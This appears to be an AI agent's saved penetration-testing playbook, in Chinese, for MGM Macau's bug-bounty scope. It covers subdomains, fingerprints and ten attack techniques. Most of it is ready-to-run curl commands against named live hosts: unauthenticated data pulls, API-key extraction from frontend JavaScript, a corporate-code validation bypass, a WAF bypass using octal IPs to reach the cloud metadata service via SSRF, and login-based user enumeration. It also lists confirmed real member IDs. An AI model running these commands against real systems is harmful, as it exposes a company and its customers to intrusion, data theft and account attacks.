---
name: mgm-src-testing-patterns
description: "MGM美高梅SRC渗透测试模式 — Mlife会员系统(FWI CMS)/booking预订系统/ADFS统一认证/F5 BIG-IP。覆盖/view/*未授权数据访问/ASMX SOAP服务/API密钥提取/OAuth2 password grant。"
category: penetration-testing-learning
tags: [src, mgm, mlife, fwicms, adfs, f5, booking, macau]
created_by: agent
---

# MGM SRC 测试模式 (mgm.mo / mlife.mo)

## 触发条件
- 测试范围含 mgm.mo, mlife.mo, booking.mgm.mo, adfs.mgm.mo, roster.mgm.mo
- 目标使用 Four Winds Interactive (FWI) CMS 框架
- 目标使用 Microsoft ADFS 作为 SSO

## 目标范围
在范围内: Mlife.mo, MGM membership rewards Android/iOS app, mgm.mo, static.mgm.mo, www.mgm.mo, mobileapp-gaming.mgm.mo, mobileapp-non-gaming.mgm.mo, WechatMiniApp, booking.mgm.mo, jobs.mgm.mo

排除: mobile-museum.mgm.mo, admin-museum.mgm.mo, museumguiding.mgm.mo, admin-museumguiding.mgm.mo, api-museum.mgm.mo, oss-museum.mgm.mo

## 子域名枚举

```bash
subfinder -d mgm.mo -silent
```

活跃子域(2026-06实测):
- Mlife.mo (307KB, FWI CMS, F5 BIG-IP)
- booking.mgm.mo (UmiJS SPA, nginx, 腾讯云WAF)
- adfs.mgm.mo (Microsoft ADFS)
- roster.mgm.mo (F5 BIG-IP APM)
- carpark.mgm.mo (F5 BIG-IP, /Home/Index)
- mlifeinsider.mgm.mo (F5 BIG-IP, /roster)
- merchants.mgm.mo (F5 BIG-IP)
- tickets.mgm.mo (Reblaze WAF, 247状态码)
- ra.mgm.mo (Zscaler Private Access)

WAF保护(405页面): www.mgm.mo, static.mgm.mo, app.mgm.mo, jobs.mgm.mo, training.mgm.mo, preview-fanzone.mgm.mo, mgmwebcdn.mgm.mo

## 四、指纹识别

### Four Winds Interactive (FWI) CMS
- 页面含 `FourWindsIntegration` 路径
- JS文件: `js/fwimobile.min.js`, `js/aes.js`, `js/motixGames.js`
- Cookie: `_csrf`, `mrt.sid`, `sessionExpiration`, `BIGipServerpool_*`, `TS01c97fa7`
- 认证: Player ID (8位数字) + PIN (4位数字) + 出生日期
- 端点模式: `/FourWindsIntegration/GamingLoyaltySystem/*.ashx`
- 模板变量: `{integrationUrl}`, `{integrationConnection}`, `{sessionId}`, `{ESB4IF}`

### Microsoft ADFS
- 端点: `/adfs/ls/idpinitiatedsignon.aspx`
- 元数据: `/FederationMetadata/2007-06/FederationMetadata.xml`
- OpenID: `/adfs/.well-known/openid-configuration`
- WS-Trust: `/adfs/services/trust/2005/usernamemixed`

### F5 BIG-IP APM
- Cookie: `MRHSession`, `LastMRH_Session`, `MRHSHint`
- 端点: `/my.policy`, `/vdesk/hangup.php3`, `/tmui/login.jsp`

### Reblaze WAF (tickets.mgm.mo)
- 状态码: 247
- 响应体含: `rbzns`, `winsocks`, `bereshit`

## 高价值漏洞测试

### 1. FWI /view/* 未授权数据访问 [已验证-中危]

FWI CMS 的 `/view/{viewName}` 端点可能无需认证返回业务数据。

```bash
# 枚举所有view名称(从页面HTML提取)
curl -sk 'https://Mlife.mo' | grep -oP '"viewId":"[^"]*"' | sort -u

# 测试所有view端点
views="offers accommodations pointRedemptions freeComps onlineshopping transactions messages promotions news auto digital education entertainment finance media mobile reading realestate sales sports technology travel"
for view in $views; do
  resp=$(curl -sk --max-time 5 "https://Mlife.mo/view/${view}" 2>/dev/null)
  len=${#resp}
  [ "$len" -gt 2 ] && echo "/view/${view} | ${len}B"
done
```

已确认可未授权访问的端点:
- `/view/offers` (15KB) — 优惠数据(船票/餐饮/住宿)
- `/view/accommodations` (2KB) — 酒店房间数据含电话和邮箱
- `/view/pointRedemptions` (2KB) — 积分兑换数据
- `/view/freeComps` (734B) — 免费优惠
- `/view/onlineshopping` (918B) — 在线购物

需要session的端点:
- `/view/baccaratTrend` — 返回 `SESSION_REQUIRED`
- `/view/luckyDraw` — 返回 `SESSION_REQUIRED`

### 2. FWI ASMX SOAP服务暴露 [已验证-中危]

FWI CMS 在 `/FourWindsIntegration/eHostWebservice/` 下暴露 ASMX Web服务。

```bash
# 检查WSDL
curl -sk 'https://Mlife.mo/FourWindsIntegration/eHostWebservice/Barcode.asmx?WSDL'

# 调用GenerateCode(无认证)
curl -sk -X POST 'https://Mlife.mo/FourWindsIntegration/eHostWebservice/Barcode.asmx/GenerateCode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CodeText=TEST123&CodeHeight=100&CodeWidth=100&ResponseFormat=image'

# 检查其他ASMX服务
for asmx in PlayerService LoyaltyService AuthService PaymentService ReservationService IntegrationService ESBService; do
  curl -sk "https://Mlife.mo/FourWindsIntegration/eHostWebservice/${asmx}.asmx" -o /dev/null -w '%{http_code} ${asmx}\n'
done
```

已确认:
- `Barcode.asmx` — WSDL完全暴露，GenerateCode可无认证调用
- `PlayerService.asmx`, `LoyaltyService.asmx`, `AuthService.asmx` 等 — 存在但重定向到customerror.aspx

### 3. FWI /encryptAES256 未授权加密 [已验证-中危]

```bash
curl -sk -X POST 'https://Mlife.mo/encryptAES256' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'playerId=10000001&pin=1234&email=test@test.com&password=admin123'
```

返回AES-256加密后的值。暴露加密算法，可用于已知明文攻击。

### 4. FWI 认证端点差异分析

```bash
# /login — 返回"登录时效已过"(session校验失败)
curl -sk -X POST 'https://Mlife.mo/login' -d 'playerId=10000001&pin=1234'

# /LoginMlifeESB — 返回"Login failed"(实际验证凭据)
curl -sk -X POST 'https://Mlife.mo/LoginMlifeESB' -d 'playerId=10000001&pin=1234'

# /ESB_Token_Validator — 无认证Token验证
curl -sk -X POST 'https://Mlife.mo/ESB_Token_Validator' -d 'token=test'
```

### 5. ADFS OAuth2 password grant [需有效client_id]

```bash
# 测试password grant是否启用
curl -sk -X POST 'https://adfs.mgm.mo/adfs/oauth2/token' \
  -d 'grant_type=password&client_id=TEST&username=user&password=pass&scope=openid'
# 如果返回 "invalid_client" (非 "unsupported_grant_type") = password grant已启用
# 如果返回 "invalid_grant" = client_id有效，凭据错误

# 获取OpenID配置
curl -sk 'https://adfs.mgm.mo/adfs/.well-known/openid-configuration' | python3 -m json.tool

# 获取FederationMetadata
curl -sk 'https://adfs.mgm.mo/FederationMetadata/2007-06/FederationMetadata.xml'
```

### 6. booking.mgm.mo 前端JS密钥提取

```bash
# 提取API密钥和内网IP
curl -sk 'https://booking.mgm.mo/umi.73a35b49.js' | grep -oP 'var e=\{[^}]*\}'
# 泄露: ak(API密钥), apiServer(内网IP:端口), ssl, env, memberUrl
```

## 已知漏洞(已提交)
1. cpark XSS
2. API未授权访问
3. 安全头缺失
4. FWIdDEV暴露
5. SourceMap泄露
6. 企业代码/mlifeToken泄露

### 7. CORS泄露内部域名 → API未授权访问 [已验证-高危]

booking.mgm.mo的OPTIONS响应泄露内部域名，该域名的API无需认证返回大量业务数据。

```bash
# 获取内部域名
curl -sk -X OPTIONS 'https://booking.mgm.mo/api' \
  -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' -D- 2>/dev/null | grep access-control-allow-origin
# 返回: access-control-allow-origin: https://mgm-booking.itedigital.cn

# 在内部域名上测试所有API端点
for path in /api/dropdown/dropdowns /api/locale/get /api/rateAndRoom/filter/get \
  /api/rateAndRoom/specialRequest/get /api/calendar/get /api/content/get \
  /api/Mlife/mlifeToken /api/Mlife/PatronInfos /api/Mlife/Logout; do
  curl -sk -X POST "https://mgm-booking.itedigital.cn${path}" -H 'Content-Type: application/json' -d '{}' -o /dev/null -w "%{http_code} %{size_download}B ${path}\n"
done
```

已确认返回数据的端点:
- `/api/dropdown/dropdowns` (141KB) — 房间类型、称谓、货币
- `/api/locale/get` (66KB) — 所有UI翻译文本
- `/api/rateAndRoom/filter/get` (889B) — 房间筛选条件
- `/api/rateAndRoom/specialRequest/get` (375B) — 特殊请求选项

### 8. 企业代码验证缺陷 [已验证-高危]

booking后端对企业代码不验证，任意代码返回true；但groupCode有正常验证。

```bash
# 企业代码 — 所有代码返回true(漏洞)
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/rateAndRoom/corporateCode/check' \
  -H 'Content-Type: application/json' -d '{"corporateCode":"FAKECODE","hotelCode":"MGM","template":"001STD"}'
# 返回: {"success":true,"data":true}

# groupCode — 正常验证(对比)
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/rateAndRoom/groupCode/check' \
  -H 'Content-Type: application/json' -d '{"groupCode":"FAKECODE","hotelCode":"MGM","template":"001STD"}'
# 返回: {"success":false,"data":false}
```

注意: 前端有额外验证层，会显示"Please enter a valid corporate code"。绕过需要浏览器插件或代理修改响应。

### 9. WAF八进制IP绕过 [已验证-高危]

阿里云WAF不识别八进制/十六进制IP格式，可绕过内网IP检测。

```bash
# 被拦截:
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://127.0.0.1/'
# 返回: Request Rejected

# 绕过成功:
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://0177.0.0.1/'
# 返回: FWI0002应用层错误(非WAF拦截)

# 云元数据地址也可绕过:
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://0251.0376.0245.0234/latest/meta-data/'
```

注意: SSRF请求到达后端，但Connection参数无效导致无法获取响应内容。

### 10. FWI /LoginMlifeESB 用户枚举 [已验证-中危]

不同playerId返回不同错误信息，可识别真实用户。

```bash
# 真实用户(PIN锁定):
curl -sk -X POST 'https://Mlife.mo/LoginMlifeESB' -d 'playerId=11111111&pin=1234&dateOfBirthYear=1990&dateOfBirthMonth=01&dateOfBirthDay=01'
# 返回: "The PIN is locked. Please contact M life For assistance."

# 不存在用户:
curl -sk -X POST 'https://Mlife.mo/LoginMlifeESB' -d 'playerId=99999999&pin=1234&dateOfBirthYear=1990&dateOfBirthMonth=01&dateOfBirthDay=01'
# 返回: "Login failed. Please proceed to M life for assistance."
```

已确认真实用户: 11111111, 66666666, 88888888

## 用户偏好 (SRC报告格式)
- 报告直接输出对话，不用代码块
- 报告间用===分隔，可独立复制
- 单行curl方便复制
- Authorization: Basic后面必须有空格
- 只要实质漏洞，不要弱信息泄露
- 用户会反复要求"真正有价值""高危害"——纯信息泄露会被拒绝
- 必须有完整POC+实际利用验证，不只是API返回true
- 对比验证：展示漏洞端点vs正常端点的不同响应

## 防御措施
- booking.mgm.mo: 腾讯云WAF (x-waf-uuid头)
- www/static/app/jobs: 阿里云WAF (aliyungf_tc cookie, Tengine)
- tickets.mgm.mo: Reblaze WAF (247状态码)
- Mlife.mo: F5 BIG-IP ASM (TS01c97fa7 cookie)
- SSRF: 内网IP访问被WAF拦截

## 关联技能
- `pentest-recon-driven` — 信息收集驱动渗透
- `src-vuln-hunting` — SRC漏洞挖掘全流程
- `exploit-chain` — 端到端攻击链
